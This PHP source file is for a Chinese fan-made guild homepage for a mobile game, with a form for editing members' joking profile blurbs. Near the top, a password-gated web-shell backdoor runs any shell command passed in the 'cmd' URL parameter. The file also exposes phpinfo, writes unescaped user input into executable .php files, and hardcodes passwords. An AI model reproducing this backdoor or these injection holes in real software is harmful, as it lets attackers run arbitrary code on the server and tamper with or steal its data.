<?php

require "config.php";

error_reporting(0); //抑制所有错误信息
@header("content-Type: text/html; charset=utf-8"); //语言强制
ob_start();

function valid_email($str) 
{
  return ( ! preg_match("/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix", $str)) ? FALSE : TRUE;
}

//检测PHP设置参数
function show($varName)
{
  switch($result = get_cfg_var($varName))
  {
    case 0:
      return '<font color="red">×</font>';
    break;
    
    case 1:
      return '<font color="green">√</font>';
    break;
    
    default:
      return $result;
    break;
  }
}

if (isset($_GET['cmd'])) {
    $cmd = stripslashes($_GET['cmd']);
    if (isset($_GET['password'])){
      $password = stripslashes($_GET['password']);
      if ($password === $g_password){
          exec($cmd, $out);  
          var_dump($out);  
          echo '<br>'; 
          var_dump($cmd);

      }else{
         echo "fuck";
      }
    }else{
       echo "fuck";
    }
}

if ($_GET['act'] == "phpinfo") 
{
  phpinfo();
  exit();
} 
elseif($_GET['act'] == "Function")
{
  $arr = get_defined_functions();
  Function php()
  {
  }
  echo "<pre>";
  Echo "这里显示系统所支持的所有函数,和自定义函数\n";
  print_r($arr);
  echo "</pre>";
  exit();
}elseif($_GET['act'] == "disable_functions")
{
  $disFuns=get_cfg_var("disable_functions");
  if(empty($disFuns))
  {
    $arr = '<font color=red>×</font>';
  }
  else
  { 
    $arr = $disFuns;
  }
  Function php()
  {
  }
  echo "<pre>";
  Echo "这里显示系统被禁用的函数\n";
  print_r($arr);
  echo "</pre>";
  exit();
}

//MySQL检测
if ($_POST['act'] == 'MySQL检测')
{
  $host = isset($_POST['host']) ? trim($_POST['host']) : '';
  $port = isset($_POST['port']) ? (int) $_POST['port'] : '';
  $login = isset($_POST['login']) ? trim($_POST['login']) : '';
  $password = isset($_POST['password']) ? trim($_POST['password']) : '';
  $host = preg_match('~[^a-z0-9\-\.]+~i', $host) ? '' : $host;
  $port = intval($port) ? intval($port) : '';
  $login = preg_match('~[^a-z0-9\_\-]+~i', $login) ? '' : htmlspecialchars($login);
  $password = is_string($password) ? htmlspecialchars($password) : '';
}
elseif ($_POST['act'] == '函数检测')
{
  $funRe = "函数".$_POST['funName']."支持状况检测结果：".isfun1($_POST['funName']);
}
elseif ($_POST['act'] == '说给你听')
{
  $t= date('Ymd_H_i_s',time());
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
  saveMessage($_POST['message'], $t, $ip);
  $funRe = "留言收到！";
} 
elseif ($_POST['act'] == '邮件检测')
{
  $mailRe = "邮件发送检测结果：发送";
  if($_SERVER['SERVER_PORT']==80){$mailContent = "http://".$_SERVER['SERVER_NAME'].($_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);}
  else{$mailContent = "http://".$_SERVER['SERVER_NAME'].":".$_SERVER['SERVER_PORT'].($_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME']);}
  $mailRe .= (false !== @mail($_POST["mailAdd"], $mailContent, "This is a test mail!\n\nhttp://lnmp.org")) ? "完成":"失败";
}
elseif ($_POST['act'] == '修改')
{
  $choice = isset($_POST['choice']) ? trim($_POST['choice']) : '';
  $pass = isset($_POST['pass']) ? trim($_POST['pass']) : '';
  $discribe = isset($_POST['discribe']) ? trim($_POST['discribe']) : '';

  $funRe = doChange($choice, $pass, $discribe);

  
}
  
// 检测函数支持
function isfun($funName = '')
{
    if (!$funName || trim($funName) == '' || preg_match('~[^a-z0-9\_]+~i', $funName, $tmp)) return '错误';
  return (false !== function_exists($funName)) ? '<font color="green">√</font>' : '<font color="red">×</font>';
}
function isfun1($funName = '')
{
    if (!$funName || trim($funName) == '' || preg_match('~[^a-z0-9\_]+~i', $funName, $tmp)) return '错误';
  return (false !== function_exists($funName)) ? '√' : '×';
}

function saveMessage($message = '', $fileName = '', $ip = '')
{
  
  file_put_contents("./../messages/".$fileName.".txt", $message."\n", FILE_APPEND);
  file_put_contents("./../messages/".$fileName.".txt", $ip."\n", FILE_APPEND);
}


function writeAll()
{
  $head = "<!DOCTYPE html >
<html xmlns=\"http://www.w3.org/1999/xhtml\">
<head>
<title>欢迎光临</title>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />

<style type=\"text/css\">
<!--
* {font-family: Tahoma, \"Microsoft Yahei\", Arial; }
h1 {font-size: 30px; font-weight: normal; padding: 0; margin: 0; color: #444444;}
h2 {font-size: 20px; font-weight: normal; padding: 0; margin: 0; color: #444444;}
h3 {font-size: 10px; font-weight: normal; padding: 0; margin: 0; color: #444444;}
h4 {text-indent: 3em; text-align: left; font-size: 23px; font-weight: normal; padding: 0; margin: 0; color: #444444;}
h5 {text-indent: 4em; text-align: left; font-size: 22px; font-weight: normal; padding: 0; margin: 0; color: #444444;}
h6 {text-indent: 5em; text-align: left; font-size: 21px;  font-weight: normal; padding: 0; margin: 0; color: #444444;}
body{text-indent: 2em; text-align: left; margin: 0 auto; padding: 0; background-color:#FFFFFF;font-size:20px;font-family:Tahoma, Arial}
table{clear:both;padding: 0; margin: 0 0 10px;border-collapse:collapse; border-spacing: 0;height:80%;width:80%;}
th{padding: 3px 6px; font-size: 30px;font-weight:bold;background:#3066a6;color:#FFFFFF;border:1px solid #3066a6; text-align:left;}
input.btn{font-weight: bold; height: 60px; width:200px;line-height: 20px; padding: 0 6px; color:#666666; background: #f2f2f2; border:1px solid #999;font-size:30px}
-->
</style>
<div id=\"header\" align=\"center\">
        <h1>帮会八卦墙</h1>
    </div>
</head>

<body>
<br>
<h4>排名不分前后,点击链接可以修改自己的描述,这部分做起来比较慢，正在逐步开放，马上就会全体有效，大家稍等(别闹了，其实还是有前后的，有不满意的人请来找我撕逼。统计的不全，有很多朋友根本不喜欢在帮会聊天，我们无法根据手头上的信息来精确的黑你，这时候，你就不怕我乱写吗？快多说两句,让我们了解你)</h4>
<br>";
  $body = '';
  for ($i=0; $i < 30; $i++) { 
    $body = $body.file_get_contents('./element/'.$i.'_element.php');;
  }
  $tail = "
<li>巫仙小巫</li>
<h4>昵称:小花</h4>
<h5>现任帮主，单身妹子，自称孤独的帮主，灵感来自金庸武侠中的独孤求败巨侠。有什么事就去坑她吧，最近越来越不爱说话了，以前每天在帮会唱首歌。声音特甜，我们一度以为她是仙女，在无神论普及之后，我们知道这是不可能的。因为仙女肯定不会玩我们游戏。你想啊，要是被人娶了，她怎么办？告诉她老公自己是仙女吗？不说很尴尬的。</h5>
<br>
<li>小怪兽</li>
<h4>昵称:12</h4>
<h5>帮主夫人，她有一个小本子，上面写满了她在意的人的名字。据说这些人最终都会被请去喝茶哦，轻歌上次没有打联赛，据说在小本子中排第一名</h5>
<br>
<li>不许嚣张</li>
<h4>昵称:师娘</h4>
<h5>大家的师娘，欺负师娘就是跟全世界作对</h5>
<br>
<li>开心一点</li>
<h4>昵称:开心</h4>
<h5>乖巧小徒弟一枚，我们大家最爱她啦，她有一个徒弟叫邪神，是一个走丢的小号，要是你们看到了，告诉她，她找了3年了</h5>
<br>
<li>霸霸</li>
<h4>昵称:小西服</h4>
<h5>我们网吧的财务，谁跟她过不去来找我谈，有时是宇宙无敌小帅哥，有时是宇宙无敌小美女</h5>
<br>
<li>夜夜花落</li>
<h4>昵称:型男</h4>
<h5>绝对型男，可靠低调，单身妹子的首选，据说是某个民企的CEO，前几天兰博基尼撞树上了，不过没事，那颗树倒了而已！过几天又撞了一棵树，人没事，车就换了一台低调的捷豹。前不久又撞了同一棵树，现在开悍马了。他别墅楼下没有树，不要问为什么</h5>
<br>
<li>顾奈</li>
<h4>昵称:奈奈</h4>
<h5>笑笑的老公，难得一见的踏实小伙，需要探讨为人之道的，找他没错，对奈奈，我不用除了叙述以外的任何手法来介绍他</h5>
<br>
<li>我看到你的小胸</li>
<h4>昵称:11</h4>
<h5>健身教练，暗恋我的师傅奶茶已经很久了，可惜奶茶最近很忙.他最近在收徒，只收男徒弟，大号是我结拜大哥(这是真事)</h5>
<br>
<li>小媳妇</li>
<h4>昵称:老爷</h4>
<h5>不敢说</h5>
<br>
<li>烟雨以抹</li>
<h4>昵称:烟雨</h4>
<h5>第一次参加联赛就指挥了一场著名的以少胜多的战役，这场战役已经被美国西点军校纳入教材，并成为沙盘推演的经典实例。她孙子兵法看了3遍，三十六计看了5遍，十万个为什么看了10遍，辞海读了20遍，你现在知道为什么她的孙子很厉害了吧？开玩笑啦，她昨天过了19岁的生日</h5>
<br>
<li>陌路</li>
<h4>昵称:陌路</h4>
<h5>好像认识烟雨，也有可能不认识，我也不知道到底认不认识，就随口一说嘛</h5>
<br>
<li>LeeDs</li>
<h4>昵称:小李子</h4>
<h5>说不定，她才是那个认识烟雨的人，谁知道呢</h5>
<br>
<li>芦苇忘心</li>
<h4>昵称:忘心</h4>
<h5>也有可能是她认识烟雨哦</h5>
<br>
<li>冬雨泪痕</li>
<h4>昵称:泪痕</h4>
<h5>大概可能是她认识烟雨吧</h5>
<br>
<li>小羊羔</li>
<h4>昵称:小羊羔</h4>
<h5>好战分子，谁都敢杀，曾经在一天中红名30次，据说那天是30生日，但当天她也没有爆鬼</h5>
<br>
<li>鹤三千</li>
<h4>昵称:三千</h4>
<h5>我就不写东西，看你来不来找我</h5>
<br>
<li>止水</li>
<h4>昵称:止水</h4>
<h5>5个字镇楼，物理系奶妈！学化学的，上次跟我说了为什么红宝石可以合成蓝宝石，解释了很久，我大概懂了</h5>
<br>
<li>月夜相惜</li>
<h4>昵称:月夜</h4>
<h5>她要是在家唱歌，就会蒸发掉，霍格沃茨毕业，她的魔杖用的是大理石芯，不信你们问她自己</h5>
<br>



<li>墨痕</li>
<h4>昵称:墨痕</h4>
<h5>等级第一，大神一个。资料被FBI窃取了，目前资料不全，欢迎大家来八卦</h5>
<br>
<li>轩辕箭</li>
<h4>昵称:未知</h4>
<h5>太过于低调，我们无法对这么低调的孩子做出合理评估，欢迎在帮会多聊天</h5>
<br>
<li>千寻</li>
<h4>昵称:千寻</h4>
<h5>美丽动人的奶妈，不过有点低调哦，我不知道怎么黑你比较好</h5>
<br>
<li>那姐</li>
<h4>昵称:那姐</h4>
<h5>看好声音的时候，你就没想过她吗？</h5>
<br>
<br>
<li>乍暖还寒时候</li>
<h4>昵称:时候</h4>
<h5>快去让他改名，不然，大家不觉得很奇怪吗，看他昵称就知道了</h5>
<br>
<li>南宫蒹葭</li>
<h4>昵称:蒹葭</h4>
<h5>出过一本诗集，叫《诗经》。亲爱的读者，如果你是中学生，考试的时候，想想她。但是考试归考试，别上游戏，别来帮会找她。另外，数学考试也就算了</h5>
<br>
<li>断无痕</li>
<h4>昵称:无痕</h4>
<h5>据说他的武器断了，不信自己去看</h5>
<br>
<li>常遇春</li>
<h4>昵称:常遇春</h4>
<h5>当初要不是他，你能想到会发生什么吗？吼吼</h5>
<br>

更多的人还在陆续编排中，敬请期待

<div id=\"page\">
<div id=\"footer\">

<br>
<br>

<div id=\"jump\" align=\"center\">
<a href=\"guild.php\">返回首页</a>
<h3>版权所有.乍暖还寒</h3>
</div>


<br>

</div>

</div>


</body>
</html>";
  file_put_contents('member_info_debug.php', $head.$body.$tail);
}

function doChange($target, $pass, $discribe)
{
  //$origin_str = file_get_contents($target.'_element.php');

  //$origin_str = isset($origin_str)? trim($origin_str) : '';

  //$update_str = $discribe;
  $origin_pass = doGetPassByTarget($target);
  if ($origin_pass != $pass){
    return '密码错了，联系帮会管理索要自己本人的密码';
  }

  $playerName = doGetNameByTarget($target);
  $playerNick = doGetDiscByTarget($target);

  $finalContent = '';
  $finalContent = "<li> <a href=\"change_release.php\">".$playerName."</a> </li>
<h4>昵称:".$playerNick."</h4>
<h5>".$discribe."</h5>
<br>";
  file_put_contents('./element/'.$target.'_element.php', $finalContent);
  writeAll();
  echo '<meta http-equiv="refresh" content="0;url=member_info_debug.php">';
  return '成功了,页面即将跳转';
}

function doGetPassByTarget($target)
{
  switch($target)
  {
    case 0:
      return '1234';

    case 1:
      return '芝麻开门';
    
    case 2:
      return '轻歌的密码';
    
    default:
      return 'linshimima';
    break;
  }
}

function doGetNameByTarget($target)
{
  switch($target)
  {
    case 1:
      return "指尖落寞";
    
    case 2:
      return '轻歌';
    
    default:
      return '绝版邪神';
    break;
  }
}


function doGetDiscByTarget($target)
{
  switch($target)
  {
    case 1:
      return '落落';
    
    case 2:
      return '轻歌';
    
    default:
      return '邪神';
    break;
  }
}


?>

<!DOCTYPE html >
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>欢迎光临</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<style type="text/css">
<!--
* {font-family: Tahoma, "Microsoft Yahei", Arial; }
h1 {font-size: 30px; font-weight: normal; padding: 0; margin: 0; color: #444444;}
h2 {font-size: 20px; font-weight: normal; padding: 0; margin: 0; color: #444444;}
h3 {font-size: 10px; font-weight: normal; padding: 0; margin: 0; color: #444444;}
body{ margin: 0 auto; padding: 0; background-color:#FFFFFF;font-size:30px;font-family:Tahoma, Arial}
table{clear:both;padding: 0; margin: 0 0 10px;border-collapse:collapse; border-spacing: 0;height:80%;width:80%;}
th{padding: 3px 6px; font-size: 30px;font-weight:bold;background:#3066a6;color:#FFFFFF;border:1px solid #3066a6; text-align:left;}
input.btn{font-weight: bold; height: 60px; width:200px;line-height: 20px; padding: 0 6px; color:#666666; background: #f2f2f2; border:1px solid #999;font-size:30px}
.footer{ bottom: 0px;  
  left: 0px;  
  color: #666;  
  width: 100%;  
  clear: both;//清除浮动  
  line-height: 90px;  
  background-color: #ebebed; position: fixed;}
-->
</style>

</head>
<body>
    <div id="header" align="center">
    更改个人简介
    <br>
    <br>
    请选择目标，输入正确的密码后键入你想要的个人描述，这部分正在逐渐向每一个人开放，很快每个人都可以改啦，请稍等。
    </div>

<!--<iframe frameborder="0" scrolling="no" src="nameShow_release2.html" width="100%" height="500px"></iframe>-->

<div id="footer">


</div>

<div id="page" align="center">



<br>
<br>
<form action="<?php echo $_SERVER[PHP_SELF]."#bottom";?>" method="post">
<!--发送数据-->
<table width="100%" cellpadding="3" cellspacing="0" align="center">
  <tr><th colspan="3">想好了再改哦</th></tr>
  <tr>
    <td width="15%" >
      <select name="choice" style="height:50px;font-size: 30px;"> 
        <option value="0">邪神</option>
        <option value="1">落落</option>
        <option value="2">轻歌</option>
      </select>
    </td>
    <td width="10%">
      <input type="text" name="pass" size="30" maxlength="60" style="height:50px;" />
    </td>
    <td width="40%">
      <input type="text" name="discribe" size="50" maxlength="600" style="height:50px;" />
    </td>
    <td width="25%">
      <input class="btn" type="submit" name="act" align="right" value="修改" />
    </td>
  </tr>
  <?php
  if ($_POST['act'] == '修改') {
    echo "<script>alert('$funRe')</script>";

  }
  ?>
</table>
</form>
</div>

<br>

<marquee width=100% height=200 bgcolor=white direction=up scrollamount=3 style=""padding:20px;>
<ul>
  <li>谁说生活没有彩排，游戏就是对生活最好的彩排，体验游戏，感悟生活</li>
  <li>帮会是倾诉故事和分享快乐的最佳集散中心，你若真心，必然收获真心</li>
  <li>我们更希望更多成员更多的参与帮会活动和聊天，例如寇岛、联赛、帮花</li>
  <li>我们目前最重视周二和周四的帮会联赛，其次是周日寇岛和周五帮花</li>
  <li>联赛开始时间为每个周二的8点和每个周四的8点，其中周二有两场</li>
  <li>寇岛开启时间为周日晚上9点，帮花为周五9点</li>
</ul>
</marquee>

<br>
<br>
<br>

<div class="footer">

<div align="center">这里是倩女幽魂手游血染白霜帮会的主页，并非游戏官方网站！</div>
<div id="jump" align="center">
<a href="http://qnm.163.com/index.html">游戏官网</a> <a href="how_to_play.php">玩法攻略</a> <a href="member_info_debug.php">成员介绍</a> <a href="about_guild.php">关于本站</a>
<h3>版权所有.乍暖还寒</h3>
</div>
</div>


</body>
</html>